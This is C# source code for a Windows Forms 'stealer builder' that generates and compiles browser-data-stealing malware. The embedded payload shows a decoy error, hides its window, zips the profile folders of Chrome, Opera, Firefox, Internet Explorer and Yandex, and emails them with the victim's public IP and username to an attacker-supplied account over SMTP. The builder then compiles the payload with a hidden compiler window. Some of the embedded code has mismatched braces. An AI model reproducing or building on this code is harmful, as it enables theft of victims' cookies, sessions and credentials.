using System;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;
using System.IO;

namespace StealBuilder_By_FormatC
{
    public partial class Form1 : Form
    {
        // Code of stealer
        private static string GetCode(string mailFrom, string mailFromPass, string mailTo, string smtp)
        {
            string code = "using System;\n" +
                "using System.Net;\n" +
                "using System.Net.Mail;\n" +
                "using System.Runtime.InteropServices;\n" +
                "using System.Windows.Forms;\n" +
                "using System.IO;\n" +
                "using System.Threading;\n" +
                "using System.Net.Mime;\n" +
                "using Ionic.Zip;\n" +
                "\n" +
                "namespace Stealler\n" +
                "{\n" +
                "\tstatic class Program\n" +
                "\t{\n" +
                "\t\t[DllImport(\"kernel32.dll\")]\n" +
                "\t\tstatic extern IntPtr GetConsoleWindow();\n" +
                "\t\t[DllImport(\"user32.dll\")]\n" +
                "\t\tstatic extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n" +
                "\t\tconst int SW_HIDE = 0;\n" +
                "\t\t[STAThread]\n" +
                "\t\tstatic void Main()\n" +
                "\t\t{\n" +
                "\t\t\tMessageBox.Show(\"Error: not found mscvr_x64.exe.\");\n" +
                "\t\t\tShowWindow(GetConsoleWindow(), SW_HIDE);\n" +
                "\t\t\tstring[] browsers = {@\"C:\\Users\\\" + Environment.UserName + @\"\\AppData\\Local\\Google\\\",\n" +
                "\t\t\t@\"C:\\Users\\\" + Environment.UserName + @\"\\AppData\\Roaming\\Opera Software\\Opera Stable\\\",\n" +
                "\t\t\t@\"C:\\Documents and Settings\\\" + Environment.UserName + @\"\\Application Data\\Mozilla\\Firefox\\\",\n" +
                "\t\t\t@\"C:\\Users\\\" + Environment.UserName + @\"\\AppData\\Roaming\\Mozilla\\Firefox\\\",\n" +
                "\t\t\t@\"C:\\Users\\\" + Environment.UserName + @\"\\AppData\\Local\\Microsoft\\Internet Explorer\\\",\n" +
                "\t\t\t@\"C:\\Users\\\" + Environment.UserName + @\"\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\\"};\n" +
                "\n" +
                "\t\t\tstring[] browsers_name = { \"Google Chrome\", \"Opera\", \"Firfox\", \"Firefox\", \"Internet Explorer\", \"Yandex\" };\n" +
                "\t\t\tfor (int i = 0; i < browsers.Length; i++)\n" +
                "\t\t\t{\n" +
                "\t\t\t\ttry\n" +
                "\t\t\t\t{\n" +
                "\t\t\t\t\tIonic.Zip.ZipFile zip = new Ionic.Zip.ZipFile();\n" +
                "\t\t\t\t\tzip.AddDirectory(browsers[i]);\n" +
                "\t\t\t\t\tzip.Save(@\"C:\\Windows\\Temp\\Cookies\" + i + \".zip\");\n" +
                "\t\t\t\t}\n" +
                "\t\t\t\tcatch (Exception ex) { }\n" +
                "\t\t\tfor (int k = 0; k < browsers.Length; k++)\n" +
                "\t\t\t{\n" +
                "\t\t\t\tPhishing(browsers[k], @\"C:\\Windows\\Temp\\Cookies\" + k + \".zip\", browsers_name[k]);\n" +
                "\t\t\t}\n" +
                "\t\t\tfor (int j = 0; j < browsers.Length; j++)\n" +
                "\t\t\t{\n" +
                "\t\t\t\ttry\n" +
                "\t\t\t\t{\n" +
                "\t\t\t\t\tFile.Delete(@\"C:\\Windows\\Temp\\Cookies\" + j + \".zip\");\n" +
                "\t\t\t\t}\n" +
                "\t\t\t\tcatch (Exception ex) { }\n" +
                "\t\t\t}\n" +
                "\t\t}\n" +
                "\t}\n" +
                "\t\tpublic static void Phishing(string dir, string dirZip, string brName)\n" +
                "\t\t{\n" +
                "\t\t\tThread.Sleep(3000);\n" +
                "\t\t\tMailMessage mail = new MailMessage();\n" +
                "\t\t\tmail.From = new MailAddress(\"" + mailFrom + "\");\n" +
                "\t\t\tmail.To.Add(new MailAddress(\"" + mailTo + "\"));\n" +
                "\t\t\tmail.Subject = \"STEALLER | \" + brName + \" browser | Logs on \" + Environment.UserName;\n" +
                "\t\t\tstring pubIp = new System.Net.WebClient().DownloadString(\"https://api.ipify.org\");\n" +
                "\t\t\tmail.Body = \"Cookies for \" + brName + \" browser.<br>Other: <br>Public IP: \" + pubIp + \"<br>PC Name: \" + Environment.UserName;\n" +
                "\t\t\ttry\n" +
                "\t\t\t{\n" +
                "\t\t\t\tAttachment attach = new Attachment(dirZip, MediaTypeNames.Application.Octet);\n" +
                "\t\t\t\tmail.Attachments.Add(attach);\n" +
                "\t\t\t}\n" +
                "\t\t\tcatch (Exception ex)\n" +
                "\t\t\t{\n" +
                "\t\t\t\tgoto skip;\n" +
                "\t\t\t}\n" +
                "\t\t\tSmtpClient client = new SmtpClient();\n" +
                "\t\t\tclient.Host = \"" + smtp + "\";\n" +
                "\t\t\tclient.Port = 587;\n" +
                "\t\t\tclient.EnableSsl = true;\n" +
                "\t\t\tclient.Credentials = new NetworkCredential(\"" + mailFrom + "\", \"" + mailFromPass + "\");\n" +
                "\t\t\ttry\n" +
                "\t\t\t{\n" +
                "\t\t\t\tclient.Send(mail);\n" +
                "\t\t\t}\n" +
                "\t\t\tcatch (Exception ex)\n" +
                "\t\t\t{\n" +
                "\t\t\t}\n" +
                "\t\tskip:\n" +
                "\t\t\tConsole.WriteLine();\n" +
                "\t\t\t}\n" +
                "\t\t}\n" +
                "\t}\n";
            return code;
        }
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            // Check on exists directory "Steallers"
            if (Directory.Exists("Steallers") == false)
            {
                Directory.CreateDirectory("Steallers");
            }
            // csc /out:C:\users\asus\desktop\123.exe /t:exe
            // c:\users\asus\desktop\steallerBuilder\Program.cs /r:C:\Users\asus\desktop\steallerBuilder\compiler\ionic.zip.dll
            Random rand = new Random();
            int randInt = rand.Next();

            // Check for text in textbox
            if (textBox1.Text != "" && textBox2.Text != "" && textBox3.Text != "")
            {
                // Check for a character in mail
                if (textBox1.Text.Contains("@") && textBox2.Text.Contains("@"))
                {
                    try
                    {
                        // Create and write code in file
                        StreamWriter stealler = new StreamWriter("Steallers\\" + randInt.ToString() + ".cs");
                        // Write code
                        stealler.WriteLine(GetCode(textBox2.Text, textBox3.Text, textBox1.Text, textBox4.Text));
                        // Close
                        stealler.Close();

                        // Start compiler C#
                        Process process = new System.Diagnostics.Process();
                        ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                        // No show Window
                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                        // There should be a compiler with dll in the folder
                        startInfo.FileName = @"Compiler\csc.exe";
                        // Arguments for compiler.
                        startInfo.Arguments = @" /out:Steallers\\Stealler" + randInt.ToString() + ".exe" + " /t:exe Steallers\\" + randInt.ToString() + ".cs /r:Compiler\\Ionic.Zip.dll";
                        process.StartInfo = startInfo;
                        // Start
                        process.Start();
                        // To wait for compiles
                        Thread.Sleep(1000);

                        // Check for the necessary dll. Without it, unfortunately, the stealler will not start
                        if (File.Exists("Steallers\\Ionic.Zip.dll") == false)
                        {
                            // If there is no file - copy from the compiler folder
                            File.Copy("Compiler\\Ionic.Zip.dll", "Steallers\\Ionic.Zip.dll");
                        }
                        // Delete the file with the code because it already exists .exe
                        File.Delete("Steallers\\" + randInt.ToString() + ".cs");

                        // Successfull
                        MessageBox.Show("SUCCESSFULL! Your stealler created in Stealler directory");
                    }
                    catch(Exception ex)
                    {
                        // Ooops!
                        MessageBox.Show("ERROR: " + ex.ToString());
                    }
                }
                // If there is no @ in two TextBoxes, then print an error
                else
                {
                    // Error
                    MessageBox.Show("Please, enter the correct mail");
                }
            }
            // If textBoxes is empty
            else
            {
                // Please, fill textBoxes
                MessageBox.Show("Please, fill in the fields");
            }
        }
    }
}
